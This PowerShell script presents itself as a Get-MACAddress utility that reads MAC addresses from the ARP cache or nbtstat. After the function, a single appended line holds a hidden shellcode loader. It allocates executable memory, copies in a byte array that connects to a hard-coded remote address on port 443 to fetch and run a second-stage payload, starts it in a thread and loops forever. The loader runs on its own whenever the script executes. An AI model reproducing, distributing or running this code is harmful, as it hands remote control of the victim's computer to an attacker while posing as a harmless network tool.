









function Get-MACAddress
{
    [CmdletBinding()]
    param(
        [Parameter(
            Position=0,
            Mandatory=$true,
            HelpMessage='ComputerName or IPv4-Address of the device which you want to scan')]
        [String[]]$ComputerName
    )

    Begin{
        
    }

    Process{
        foreach($ComputerName2 in $ComputerName)
        {
            $LocalAddress = @("127.0.0.1","localhost",".")

            
            if($LocalAddress -contains $ComputerName2)
            {
                $ComputerName2 = $env:COMPUTERNAME
            }

            
            if(-not(Test-Connection -ComputerName $ComputerName2 -Count 2 -Quiet))
            {
                Write-Warning -Message """$ComputerName2"" is not reachable via ICMP. ARP-Cache could not be refreshed!"
            }
            
            
            $IPv4Address = [String]::Empty
            
            if([bool]($ComputerName2 -as [System.Net.IPAddress]))
            {
                $IPv4Address = $ComputerName2
            }
            else
            {
                
                try{
                    $AddressList = @(([System.Net.Dns]::GetHostEntry($ComputerName2)).AddressList)
                    
                    foreach($Address in $AddressList)
                    {
                        if($Address.AddressFamily -eq "InterNetwork") 
                        {					
                            $IPv4Address = $Address.IPAddressToString 
                            break					
                        }
                    }					
                }
                catch{ 
                    if([String]::IsNullOrEmpty($IPv4Address))
                    {
                        Write-Error -Message "Could not resolve IPv4-Address for ""$ComputerName2"". MAC-Address resolving has been skipped. (Try to enter an IPv4-Address instead of the Hostname!)" -Category InvalidData

                        continue
                    }
                }	
            }
        
            
            $MAC = [String]::Empty
        
            
            
            $Arp_Result = (arp -a).ToUpper()
        
            foreach($Line in $Arp_Result)
            {
                if($Line.TrimStart().StartsWith($IPv4Address))
                {
                    
                    $MAC = [Regex]::Matches($Line,"([0-9A-F][0-9A-F]-){5}([0-9A-F][0-9A-F])").Value
                }
            }

            
            if([String]::IsNullOrEmpty($MAC))
            {                           
                $Nbtstat_Result = nbtstat -A $IPv4Address | Select-String "MAC"

                try{
                    $MAC = [Regex]::Matches($Nbtstat_Result, "([0-9A-F][0-9A-F]-){5}([0-9A-F][0-9A-F])").Value
                }
                catch{
                    if([String]::IsNullOrEmpty($MAC))
                    {
                        Write-Error -Message "Could not resolve MAC-Address for ""$ComputerName2"" ($IPv4Address). Make sure that your computer is in the same subnet as $ComputerName2 and $ComputerName2 is reachable." -Category ConnectionError
                        
                        continue
                    }
                }
            }
           
            [String]$Vendor = (Get-MACVendor -MACAddress $MAC | Select-Object -First 1).Vendor 
         
            [pscustomobject] @{
                ComputerName = $ComputerName2
                IPv4Address = $IPv4Address
                MACAddress = $MAC
                Vendor = $Vendor
            }
        }   
    }

    End{

    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xe6,0x47,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

